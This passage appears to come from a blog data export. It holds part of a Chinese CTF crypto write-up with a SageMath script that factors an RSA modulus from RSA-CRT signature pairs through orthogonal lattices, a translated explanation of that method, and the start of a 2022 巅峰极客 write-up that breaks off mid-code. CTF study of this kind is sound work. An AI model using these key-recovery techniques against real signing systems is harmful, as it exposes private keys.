b'z/\\xd6\\xfb\\xd8\\xfa\\xc4\\xed\\xbd\\x99\\xd0\\xa0\\x90\\xcb\\xca\\x83\\xd8B\\xa7\\xf4\\xbd\\xe0\\xc2&\\x1aQl(\\xd6p\\x8f\\x89=tT\\xf1(\\xeb\\xab\\x84[oR\\x1fl=\\xda\\xf5\\x18q\\x8f\\xa7k\\x00\\x1b\\x1a\\x0ei\\x1fa.ho\\x15\\x04\\x12\\xe4\\xc2\\xd7\\x19\\x92\\xc3\\x9b\\xfe\\xd5\\xb6R\\xf8\\x95\\x9fr\\x93\\xddD\\x1c[\\x873\\xd5\\x06\\x1b\\xa5\\x82/6\\x9a\\x13\\xcf\\xa4\\xcd\\x0e]\\t\\xad?\\xd6\\x84\\r\\x90\\xef\\x86\\xf15)\\xe34\\xf7\\xb77\\xef\\x0c&\\xdb8\\xa6\\xe0\\xa5a',\n       b'U\\x0b\\xf6\\x9cm])1\\xe2\\xad\\xf9G\\x8f\\xa2\\xbc}\\xd7\\x18\\x89\\xa4\\xfdFQ\\x80m\"\\xf9\\to^\\xd9A\\x98\\xd2\\xca\\x1e(b\\xa8\\xbe\\xc2m\\xf7\\n[O\\x00\\xbc\\x87\\x17\\xed\\x0cG\\xf2=H\\x0e\\xc0\\x14+\\xcb\\xd0\\x1feT2\\xf2Th\\xec\\xc2\\xcf>6,<\\x88X\\x8f\\xe9g\\xa8\\x00\\xafr\\x05\\x95\\rj\\x9c\\xc6\\n\\xbb\\x8a\\x019\\xc1\\x1ef#\\x02[Rh\\xd8\\xdc|{6\\xeb\\xe8U\\x91\\xa4\\xeb}\\xf4s;E\\xe72$i\\xdft\\xff\\'',\n       b'[\\x94\\x95T\\xf4\\xc4\\xca\\x8drO\\x80\\x14\\xc9<H\\xa2a\\xdc\\xf4`\\xac>\\xab\\x03\\xfa\\x80Sx\\x99\\x14\\x83$U\\x0b\\xfa\\x8fv\\xfd\\xda\\x1a\\xa0\\xebY\\xaa\\x01\\xe2XsG\\t\\xcf\\xae\\xa0\\xbf\\x82iG\\tQ \\xb1\\xfe\\xa5k\\x12\\xd9\\x12\\xf7\\x95\\xa3\\xa5\\x8d`z\\x19\\x1a\\x90-\\x9aj\\x15\\xf6f>\\x18\\x08\\xb8\\x1f\\x88\\x1a\\x80Th\\xd0\\x15\\x9bw#\\'`K\\xa5\\xf1\\xbf\"\\xe79\\xaf\\xc7z%p\\xa5\\x9f\\x14\\xef\\'1\\x11\\x05Gg\\xe9\\xda\\xc9\\x18~[',\n       b':\\xefRE\\xd7\\xa1?\\xf3\\xb5\\xf7\\xdd\\xe2\\xb6~\\x85014\\xc0\\x8a\\x80\\xe1\\xb5#\\x94\\x10\\xb2\\xa0\\xfe\\x87\\xd1t\\xc3$&\\xde8\\x195\\xcd\\xf4@3\\x15\\xcaK\\xcc\\xcd\\r:\\x83*\\xd7l\\xb6\\xf2} \\tJ\\xb5xKfjh.\\xfb\\xb5\\x91\\xc6\\xf2x\\x8e\\x83\\xdc\\xc3\\xef\\x8b\\x8dW\\xa6\\xa6\\xb0w\\xd8\\xf2G\\xa5-\\xc3\\x87\\x17;\\xedH`:\\xcd\\x08ts\\x9eqPE\\xd7\\xfc\\xc4\\x98\\xb5\\xe0\\xad\\xb7A\\x7f\\xcb\\x01\\xbd\\x98\\xd3Ea\\xb9\\x07\\x80\\xf8\\x19',\n       b\"8\\xca\\x7f!;\\\\\\xde\\x1b\\x80i\\x9b!\\x1c??u\\x13\\x955\\xd0xG\\xff\\xd7\\xba\\xfe+\\x95\\x0eu^\\x15\\x1a\\x0e*\\xfe\\x8a\\xafM\\xc0\\xd1Ty\\xd7\\xf1\\xa7@\\xd6\\xa6\\xee\\x0c:It\\x1a\\xeag\\xfc\\x0c\\xaf\\x02<\\x03T)\\xeb\\xb0\\x15\\x1cz\\x85\\x992\\xa9\\xbe\\x9bm\\xc4D\\x83\\xf7\\xb5T\\xdd9?\\x94\\xd4\\x13\\xb4\\xb3\\x8d\\xa9\\x92\\x9dt\\x86\\xdb\\x0b$\\x19l\\xb1\\xb9\\x05'o\\xf3!\\t\\x01\\x93'z\\x15P\\x88\\xd7iN\\n\\x8bA\\xb5\\xd2}\\xe8\\x10\"\n       ]\nn = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729\nN = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731\ne = 65537\nenc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396\n\n\ndef orthogonal_lattice(B):\n    _d, _n = B.nrows(), B.ncols()\n    _c = 2 ** min(((_n-1)/2+(_n-_d)*(_n-_d-1)/4), 20)\n    for b in B:\n        _c *= b.norm()\n    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))\n    B_r = B_bot.transpose().LLL()\n    LB = B_r.matrix_from_rows_and_columns(range(_n-_d), range(_d, _n+_d))\n    assert (B*LB.transpose()).is_zero()\n    return LB\n\n\nv = [crt([bytes_to_long(co_sig[i]), bytes_to_long(sig[i])], [N, n])\n     for i in range(6)]\n\nLv = orthogonal_lattice(matrix(ZZ, v))\n\nresult = orthogonal_lattice(Lv.matrix_from_rows(range(0, 6-2)))\n\nfor x, y in combinations(result, 2):\n    for a in tqdm(range(-10, 10)):\n        for b in range(-10, 10):\n            z = a*x+b*y\n            if z.norm() > sqrt(6*n):\n                continue\n            else:\n                vv = vector(v)-z\n                for i in vv:\n                    if gcd(i, n) != 1:\n                        p = gcd(i, n)\n                        assert n % gcd(i, n) == 0\n                        q = n//p\n                        phi = (p-1)*(q-1)\n                        d = inverse_mod(e, phi)\n                        m = long_to_bytes(int(pow(enc, d, n)))\n                        print(m)\n                        exit()\n```\n\n### 原理\n\nRSA-CRT 签名中计算了：\n$$\n\\sigma_p=\\mu(m)^d\\mod \\ p \\\\\\\\  \\sigma_q=\\mu(m)^d\\mod \\ q\n$$\n然后签名 $\\sigma=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta$ ，其中 $\\alpha=q\\cdot(q^{-1}\\mod\\ p)$ ， $\\beta=p\\cdot(p^{-1}\\mod\\ q)$ 。\n题目中给出 6 对签名，每对签名用 CRT 不难算出\n$$\nv=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta \\mod N\\cdot N'\n$$\n其中 $\\sigma_p$ 和 $\\sigma_q$ 和 $N/2$ 一个数量级， $\\alpha$ 和 $\\beta$ 又和 $N$ 一个数量级，故右式远小于 $N\\cdot N'$ ，那么**上式在整数域上是成立的**。\n一对算不出，但是多对可以，组成向量，有：\n$$\n\\boldsymbol{v}=\\alpha\\boldsymbol{x}+\\beta\\boldsymbol{y}\n$$\n其中 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 是分量 $n/2$ 位的未知向量， $\\alpha$ 和 $\\beta$ 是有关 $p$ 和 $q$ 的 CRT 系数。\n不难计算出一组与 $\\mathbb{Z}^\\ell$ 中正交于 $\\boldsymbol{v}$ 的向量的格 $\\boldsymbol{v}^\\bot \\in \\mathbb{Z}^\\ell$ 的约化基 $\\{\\boldsymbol{b}_1,...,\\boldsymbol{b}\\_{\\ell-1}\\}$ 。（可能此时你会疑惑为什么是 ${\\ell-1}$ 个向量，下面的拓展里有解释）\n特别地，我们有：\n$$\n\\alpha \\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle + \\beta \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0 \\quad \\mathrm{for} \\ j=1,2,\\ldots,\\ell-1\n$$\n~~（也不是很特别的感觉）~~\n现在观察方程 $\\alpha\\cdot u+\\beta\\cdot v=0$ ，最小的非零解 $(u,v)\\in \\mathbb{Z}^2$ 是 $\\pm(\\beta,-\\alpha)/g$ ，其中 $g=\\gcd(\\alpha,\\beta)$ 盲猜是非常小的（经测试基本在10以内），意味着 $|u|,|v|\\geq\\mathit{\\Omega}(N)$ 中 $\\mathit{\\Omega}$ 常量是非常小的。（啥玩意？）对 $j=1,2,\\ldots,\\ell-1$ ，有以下两种可能：\n\n**情形1**：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle = \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0$ 。此时 $\\boldsymbol{b}_j$ 属于 $\\mathbb{Z}^\\ell$ 中与 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 正交的向量的格 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$\n\n**情形2**：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle$ 和 $\\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle$ 有绝对值 $\\geq \\mathit{\\Omega}(N)$ ，其中 $\\mathit{\\Omega}(N)$ 是一个小常数。因为 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 的范数都不超过 $\\sqrt{\\ell N}$ ，由柯西-施瓦茨不等式，这意味着 $||\\boldsymbol{b}_j||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$\n\n因为格 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$ 的秩是 $\\ell-2$ ，当全部 $\\ell-1$ 个向量 $\\boldsymbol{b}\\_j$ 线性无关时情形1不成立，所以最长的 $\\boldsymbol{b}\\_{\\ell-1}$ 应该在情形2中，因此 $||\\boldsymbol{b}\\_{\\ell-1}||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$ 。另一方面，其他向量形成一个秩为 $\\ell-2$ 的格，且体积\n$$\nV=\\mathrm{vol}(\\mathbb{Z}\\boldsymbol{b}\\_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}\\_{\\ell-2})\\approx\\frac{\\mathrm{vol}(\\boldsymbol{v}^\\bot)}{||\\boldsymbol{b}\\_{\\ell-1}||}=\\frac{||\\boldsymbol{v}||}{||\\boldsymbol{b}\\_{\\ell-1}||}\\leq \\frac{\\sqrt{\\ell}\\cdot N^{3/2}}{\\mathit{\\Omega}(\\sqrt{N/\\ell})}=O(\\ell N)\n$$\n盲猜是一个随机的格。特别地，我们有：\n$$\n||\\boldsymbol{b}\\_j||=O(\\sqrt{\\ell-2}\\cdot V^{1/(\\ell-2)})=O(\\ell^{1/2+1/(\\ell-2)}\\cdot N^{1/(\\ell-2)})\\quad\\mathrm{for} \\ j=1,2,\\ldots,\\ell-2\n$$\n\n一旦 $\\ell \\geq 5$ ，这个长度就远小于 $\\sqrt{N/\\ell}$ 。假设是这种情况，那么对于 $j=1,2,...,\\ell-2$ ， $\\boldsymbol{b}\\_j$ 应该是情形1中。这意味着这些向量生成 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$ 中一个满秩的子格 $L'=\\mathbb{Z}\\boldsymbol{b}\\_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2}$ 。\n取正交格，我们得到 $(L')^\\bot \\supset L^\\bot=\\mathbb{Z}\\boldsymbol{x}\\oplus\\mathbb{Z}\\boldsymbol{y} $。因此， $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 属于 $L'$ 的正交格 $(L')^\\bot$ 。令 $\\{\\boldsymbol{x'},\\boldsymbol{y'}\\}$ 为一组该格的约化基，我们可以枚举 $(L')^\\bot$ 中的长度不超过 $\\sqrt{\\ell N}$ 且为 $\\boldsymbol{x'}$ 和 $\\boldsymbol{y'}$ 线性组合的所有格向量。高斯启发式表明这大约为：\n$$\n\\frac{\\pi(\\sqrt{\\ell N})^2}{\\mathrm{vol}((L')^\\bot)}=\\frac{\\pi\\ell N}{V}=O(1)\n$$\n这样的向量，所以这肯定是可行的。对这些向量 $\\boldsymbol{z}$ ，我们计算 $\\gcd(\\boldsymbol{v}-\\boldsymbol{z},N)$ 。我们将因此很快在其中找到 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)$ ，因为 $\\boldsymbol{x}$ 是一个 $(L')^\\bot$ 中长度 $\\leq\\sqrt{\\ell N}$ 的向量。但根据 $\\boldsymbol{v}$ 的定义，我们有：\n$$\n\\boldsymbol{v}=\\boldsymbol{x}\\mod p\\\\\\\\\n\\boldsymbol{v}=\\boldsymbol{y}\\mod q\n$$\n故 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)=p$ ，从而分解 $N$ 。\n\n### 拓展阅读-正交格\n\n令 $\\mathbf{b}_1,...,\\mathbf{b}_d$ 为 $\\mathit{\\Lambda}$ （这玩意念Lambda）中的向量。如果这 $d$ 个向量在 $\\mathbf{Z}$ 上线性无关且 $\\mathit{\\Lambda}$ 中的任意元素可以由 $\\mathbf{b}_i$ 整系数线性表出，则这 $d$ 个向量形成 $\\mathit{\\Lambda}$ 中的一组基。 $\\mathit{\\Lambda}$ 中至少存在一组基。 $\\mathit{\\Lambda}$ 的基都有相同的基数，称为 $\\mathit{\\Lambda}$ 的维度。\n\n如果 $\\mathit{\\Omega}$ 包含 $\\mathit{\\Lambda}$ ，且两者有相同的维度，则称 $\\mathit{\\Lambda}$ 为 $\\mathit{\\Omega}$ 在 $\\mathbf{Z}^n$ 上的一个子格。（子格的定义？） $\\mathit{\\Lambda}$ 的所有基张成相同的 $\\mathbf{Q}^n$ 的 $Q$ 向量子空间（啥玩意？），记为 $E_{\\mathit{\\Lambda}}$ 。 $\\mathbf{Q}^n$ 上 $E_{\\mathit{\\Lambda}}$ 的维度与 $\\mathit{\\Lambda}$ 的维度相同。令格 $\\overline{\\mathit{\\Lambda}}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 。 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 的一个子格。如果 $\\mathit{\\Lambda}=\\overline{\\mathit{\\Lambda}}$ ，那么我们称 $\\mathit{\\Lambda}$ 是一个完备格，特别的， $\\overline{\\mathit{\\Lambda}}$ 是一个完备格。\n\n> 笔者注记：\n这里首先将 $\\mathit{\\Lambda}$ 张成一个**有理数空间**，不局限于**整系数**向量组合了，记为 $E_{\\mathit{\\Lambda}}$ 的E我猜是**欧几里得**的意思？然后与 $\\mathbf{Z}^n$ 相交得到的是整数点集合 $\\overline{\\mathit{\\Lambda}}$ ，如此 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 子格的事应该挺自然的。然后如果两者相等，想象一下，都那样张成了都找不到新的点，那这个格确实也挺完备。\nPS:发现自己念了十年的欧几里得，难怪输入法打不出来（）\n\n令 $(\\mathbf{x},\\mathbf{y})\\rightarrow\\mathbf{x}.\\mathbf{y}$ 为一般意义上的欧里几德内积， $||.||$ 是它对应的范数 ~~（奇怪的表示方法）~~。令 $F=(E_{\\mathit{\\Lambda}})^-$ 是关于该内积的正交向量子空间。我们定义正交格 $\\mathit{\\Lambda}^-=F\\cap\\mathbf{Z}^n$ 。因此， $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格，其维度为 $n-d$ 。这意味着 $(\\mathit{\\Lambda}^-)^-$ 等于 $\\overline{\\mathit{\\Lambda}}$ 。令 $\\mathcal{B}=(\\mathbf{b}_1,...,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基。\n\n> 笔者注记：\n看到这就有点迷糊了，捋一捋： $E_{\\mathit{\\Lambda}}$ 是 $\\mathit{\\Lambda}$ 张成出的有理空间，然后 $F$ 是其正交向量子空间，即**任意从 $\\mathit{\\Lambda}$ 和 $F$ 分别抓两个向量出来，其内积都为 $0$** 。\n再然后 $\\mathit{\\Lambda}^-$ 是 $F$ 的一个子格，**注意到 $\\mathit{\\Lambda}^-$ 把 $F$ 所有整数点都框进去了**，这就很有意思了，由上面的定义就不难得出正交格 $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格。\n至于其维度为何是 $n-d$ ，有个概念叫**正交补**，就是正交空间的维数是刚刚好的，对于列空间维数为 $r$ 的矩阵 $A_{r\\times m}$ ，其左零空间的维数是 $m-r$ ，相加恰好为 $m$ 。举例来说，三维中与线正交的是二维空间，与面正交的是一维空间。\n这篇 paper 习惯用 $E^-$ 表示正交向量子空间，但似乎 $E^\\bot$ 的写法较为广泛。\n\n在 $\\mathbf{Z}^n$ 的正则基上解析每个 $\\mathbf{b}_j$ 如下：\n\n$$\n\\mathbf{b}\\_j =\n\\begin{pmatrix}\nb_{1,j} \\\\\\\\\nb_{2,j} \\\\\\\\\n\\vdots \\\\\\\\\nb_{n,j}\n\\end{pmatrix}\n$$\n（这里吐槽一下，由于下划线和 Markdown 语法有冲突，如果不加反斜杠， $b_j$ 写成 $\\mathbf{b}_j$ Latex 就会炸，下文一开始也炸了几回，弄了几次才发现是这问题）\n\n定义整数 $n\\times d$ 的整数矩阵 $B=(b_{i,j})_{1\\leq i\\leq n,1\\leq j\\leq d}$ ，格 $\\mathit{\\Lambda}$ 由 $B$ 的列向量张成，我们称 $\\mathit{\\Lambda}$ 由 $B$ 张成。令 $Q={^tB}B$ 为 $d\\times d$ 的对称 Gram 矩阵。 $Q$ 的行列式是与 $\\mathcal{B}$ 无关的正整数。 $\\mathit{\\Lambda}$ 的行列式被定义为 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(B)}$ 。\n\n> 笔者注记：\n这是的 ${^tB}$ 应该是 $B^T$ 的意思，又是奇怪的写法（）\n至于 Gram 矩阵，中文音译为格拉姆矩阵，对 $n$ 维欧氏空间上的 $k$ 个向量，其 Gram 矩阵为\n$$\n\\triangle(\\mathbf{v}_1,\\dots,\\mathbf{v}_k) =\n\\begin{pmatrix}\n\\langle\\mathbf{v}_1,\\mathbf{v}_1\\rangle & \\cdots & \\langle\\mathbf{v}_1,\\mathbf{v}_k\\rangle \\\\\\\\\n\\vdots & \\ddots & \\vdots \\\\\\\\\n\\langle\\mathbf{v}_k,\\mathbf{v}_1\\rangle & \\cdots & \\langle\\mathbf{v}_k,\\mathbf{v}_k\\rangle\n\\end{pmatrix}\n$$\n不难看出这个可以等价表示为 $V^T\\times V$ ，得出的矩阵也显然是对称的。\n这里 $\\mathit{\\Lambda}$ 不是一个方阵，故不能直接求出其行列式，那么就应该通过其 Gram 矩阵来求行列式，这里我觉得应该是 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(Q)}$ ，但我不确定。\n\n**定理1** 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的完备格，那么 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。\n证明：我们有 $\\mathit{\\Lambda}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 和 $\\mathit{\\Lambda}^-=E_{\\mathit{\\Lambda}}^-\\cap\\mathbf{Z}^n$ 。从另一篇论文（我也没读过）我们知道：\n$$\n\\det(\\mathbf{Z}^n)=\\frac{\\det(E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n)}{\\det((E_{\\mathit{\\Lambda}}^-)\\cap(\\mathbf{Z}^n)^*)}\n$$\n其中 $(\\mathbf{Z}^n)^*$ 表示 $\\mathbf{Z}^n$ 上的极格。但 $\\det(\\mathbf{Z}^n)=1$ （？为什么要说但呢？）且 $(\\mathbf{Z}^n)^*=\\mathbf{Z}^n$ ，故 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。\n\n**推论2** 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的格，那么 $\\det((\\mathit{\\Lambda}^-)^-)=\\det(\\mathit{\\Lambda}^-)=\\det(\\overline{\\mathit{\\Lambda}})$ 。\n\n**定理3** 令 $(\\mathbf{b}_1,...,\\mathbf{b}_d)$为格$\\mathit{\\Lambda}$ 在 $\\mathbf{Z}^n$ 上的一组 LLL 约化基，那么：\n\n1. $\\det(\\mathit{\\Lambda})\\leq \\prod^d_{i=1}||\\mathbf{b}_i||\\leq 2^{d(d-1)/4}\\det(\\mathit{\\Lambda})$\n2. 对任意线性无关的向量 $\\mathbf{x}_1,...,\\mathbf{x}_t\\in\\mathit{\\Lambda}$ ，当 $1\\leq j \\leq t$ 时，有：\n\n$$\n||\\mathbf{b}_j||\\leq 2^{(d-1)/2}\\max(||\\mathbf{x}_1||,...,||\\mathbf{x}_t||)\n$$\n\n我们现在描述计算正交格的一组 LLL 约化基的基本方法。令 $\\mathcal{B}=(\\mathbf{b}_1,...,\\mathbf{b}\\_d)$ 为 $\\mathit{\\Lambda}$ 的一组基， $B=(b\\_{i,j})$ 为其对应的 $n\\times d$ 的矩阵。令 $c$ 为一个正整数常量。定义 $\\mathit{\\Omega}$为$\\mathbf{Z}^{n+d}$ 上由以下 $(n+d)\\times n$ 矩阵张成的格。\n\n$$\nB^-=\n\\begin{pmatrix}\nc\\times b_{1,1} & c\\times b_{2,1} & \\cdots & c\\times b_{n,1} \\\\\\\\\nc\\times b_{1,2} & c\\times b_{2,2} & \\cdots & c\\times b_{n,2} \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\nc\\times b_{1,d} & c\\times b_{2,d} & \\cdots & c\\times b_{n,d} \\\\\\\\\n1 & 0 & \\cdots & 0 \\\\\\\\\n0 & 1 & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n0 & 0 & \\cdots & 1\n\\end{pmatrix}\n$$\n矩阵 $B^-$ 被分成两块：上面 $d\\times n$ 部分是 $c\\ {^tB}$ ，下面 $n\\times n$ 部分是单位阵。\n设 $p_{\\uparrow}$ 和 $p_{\\downarrow}$ 是两个投影，将 $\\mathbf{Z}^{n+d}$ 的任何向量分别映射到由其前 $d$ 个坐标构成的 $\\mathbf{Z}^d$ 向量和由其最后 $n$ 个坐标构成的 $\\mathbf{Z}^n$ 向量，所有投影都与正则基有关。~~（这段翻译累死我了）~~\n令 $\\mathbf{x}$ 为 $\\mathit{\\Omega}$ 的一个向量并记 $\\mathbf{y}=p_{\\downarrow}(\\mathbf{x})$ ，那么\n\n$$\np_{\\uparrow}(\\mathbf{y})=\n\\begin{pmatrix}\n\\mathbf{y}.\\mathbf{b}\\_1 \\\\\\\\\n\\vdots \\\\\\\\\n\\mathbf{y}.\\mathbf{b}\\_d\n\\end{pmatrix}\n$$\n因此，当且仅当 $p\\_{\\uparrow}(\\mathbf{x})=0$ 时有 $\\mathbf{y}\\in \\mathit{\\Lambda}^-$ 。此外，如果 $||\\mathbf{x}||\\leq c$ ，那么 $p_{\\uparrow}(\\mathbf{x})=0$ 。\n\n**定理4** 令 $(\\mathbf{x}_1,\\mathbf{x}_2,...,\\mathbf{x}_n)$ 为格 $\\mathit{\\Omega}$ 的一组 LLL 约化基。若\n\n$$\nc>2^{(n-1)/2+(n-d)(n-d-1)/4}\\det(\\overline{\\mathit{\\Lambda}})\n$$\n则 $(p_{\\downarrow}(\\mathbf{x}\\_1),p_{\\downarrow}(\\mathbf{x}\\_2),...,p_{\\downarrow}(\\mathbf{x}_{n-d}))$ 为 $\\overline{\\mathit{\\Lambda}}$ 的一组 LLL 约化基。\n\n使用阿达马不等式，我们得到以下算法：\n\n**算法5** 给定一组 $\\mathbf{Z}^n$ 上格 $\\mathit{\\Lambda}$ 的基 $(\\mathbf{b}_1,\\mathbf{b}_2,...,\\mathbf{b}_d)$ ，该算法计算一组 $\\overline{\\mathit{\\Lambda}}$ 的LLL约化基。\n\n1. 选取 $c=\\lceil2^{(n-1)/2+(n-d)(n-d-1)/4}\\prod^d_{j=1}||\\mathbf{b}_j||\\rceil$\n\n2. 计算 $(n+d)\\times n$ 的整数矩阵 $B^-$ 和 $\\mathbf{b}_1,...,\\mathbf{b}\\_d$ 对应的 $n\\times d$ 矩阵 $B=(b\\_{i,j})$\n\n3. 计算由 $B^-$ 张成的格的一组 LLL 约化基 $(\\mathbf{x}_1,\\mathbf{x}_2,...,\\mathbf{x}_n)$\n\n4. 输出 $(p_{\\downarrow}(\\mathbf{x}\\_1),p_{\\downarrow}(\\mathbf{x}\\_2),...,p_{\\downarrow}(\\mathbf{x}_{n-d}))$\n\n可以证明，这是一个关于空间维数 $n$ 、格维数 $d$ 和 $||\\mathbf{b}_j||$ 比特长度的任何上界的确定性多项式时间算法。在实践中，不需要选择这样大的常数 $c$ ，因为 LLL 算法的理论界非常悲观。（翻译了这么久都看不懂，我也很悲观.jpg）\n\n> 笔者注记：\n$\\lceil$和$\\rceil$表示向上取整，例如$\\lceil 1.2 \\rceil = 2$。\n\n#### 实现\n\n之前看过 Herry 师傅从 dbt 那抄的一个求法是用左零空间求解，代码如下\n\n```python\ndef orthogonal_lattice(B):\n    LB = B.transpose().left_kernel(basis=\"LLL\").basis_matrix()\n    return LB\n```\n\n但笔者发现这样似乎只能在低维下求解，高维情况下时间会爆炸（至少试过一夜都没跑出来）\n于是照着 paper 搓了一个 implemention ，快了很多，三分钟左右就能求解 $255\\times512$ 矩阵的正交格，代码如下\n\n```python\ndef orthogonal_lattice(B):\n    _d, _n = B.nrows(), B.ncols()\n    _c = 2 ** min(((_n-1)/2+(_n-_d)*(_n-_d-1)/4),20)    # this bound can be adjusted as needed\n    for b in B:\n        _c *= b.norm()\n    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))\n    B_r = B_bot.transpose().LLL()\n    LB = B_r.matrix_from_rows_and_columns(range(_n-_d), range(_d,_n+_d))\n    assert (B*LB.transpose()).is_zero()\n    return LB\n```\n\n## 参考\n\n* [P. Q. Nguyen and J. Stern. Merkle-Hellman revisited: A cryptoanalysis of the Qu-Vanstone cryptosystem based on group factorizations. In B. S. Kaliski Jr., editor, CRYPTO, volume 1294 of Lecture Notes in Computer Science, pages 198–212. Springer, 1997.](https://link.springer.com/chapter/10.1007/BFb0052236)\n\n* [Modulus Fault Attacks Against RSA-CRT Signatures](https://link.springer.com/article/10.1007/s13389-011-0015-x)\n\n* [知乎 线性代数之——正交向量与子空间](https://zhuanlan.zhihu.com/p/50483906)\n\n* [知乎 格拉姆矩阵（Gram matrix）详细解读](https://zhuanlan.zhihu.com/p/187345192)\n","source":"_posts/2022 巅峰极客 Crypto.md","raw":"---\ntitle: 2022 巅峰极客 Crypto\ndate: 2022-08-18 12:47:00\ntags: [CTF, Crypto]\ncategories: 题解\n---\n\n有瓜吃，美滋滋。\n<!--more-->\n\n题目质量一般，知识问答还全是搬运今年 ciscn 的。\n然后三个队友都没啥空，就我一个做了两道密码，排 88 名，对我这个菜鸡来说也还行吧。\n\n## point-power\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom random import *\nfrom secrets import flag\n\nassert len(flag)==42\np=getPrime(600)\na=bytes_to_long(flag)\nb=randrange(2,p-1)\nE=EllipticCurve(GF(p),[a,b])\nG=E.random_element()\n\nx1,y1,_=G\nG=2*G\nx2,y2,_=G\n\nprint(f\"p = {p}\")\nprint(f\"b = {b}\")\nprint(f\"x1 = {x1}\")\nprint(f\"x2 = {x2}\")\n'''\np = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623\nb = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147\nx1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740\nx2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727\n'''\n```\n\n这题完全是现学现卖，之前只听说过椭圆曲线，然后就跑去学抽代忘记回来了。。。\n首先查到椭圆曲线的加法（两点相同的情形）：\n$$\nx_2=m^2-2x_1\\pmod p \\ with \\ m=\\frac{3x_1^2+a}{2y_1}\n$$\n又在 Sagemath 文档查到曲线定义 $y_1^2=x_1^3+ax_1+b$ ，就能联立出一个一元二次方程，exp 如下：\n\n```python\np = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623\nb = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147\nx1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740\nx2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727\n\nK = GF(p)\nn=(K(x2+2*x1)).sqrt()\nP.<x>= PolynomialRing(K)\nA=1\nB=6*x1**2-4*n**2*x1\nC=-(4*n**2*x1**3+4*n**2*b-9*x1**4)\nf=A*x**2+B*x+C\nroots=f.roots()\nprint(roots)\nflag=roots[1][0]\nfrom Crypto.Util.number import *\nprint(long_to_bytes(int(flag)))\n```\n\n## strange curve\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom secrets import flag\nimport random\n\ndef add(P,Q):\n    (x1,y1)=P\n    (x2,y2)=Q\n\n\n    x3=(x1+x2)*(1+y1*y2)*invert((1+x1*x2)*(1-y1*y2),p)%p\n    y3=(y1+y2)*(1+x1*x2)*invert((1-x1*x2)*(1+y1*y2),p)%p\n\n    return (x3,y3)\n\ndef mul(e,P):\n    Q=(0,0)\n    e=e%p\n    while e:\n        if e&1:\n            Q=add(Q,P)\n        P=add(P,P)\n        e>>=1\n    return Q\n\ndef 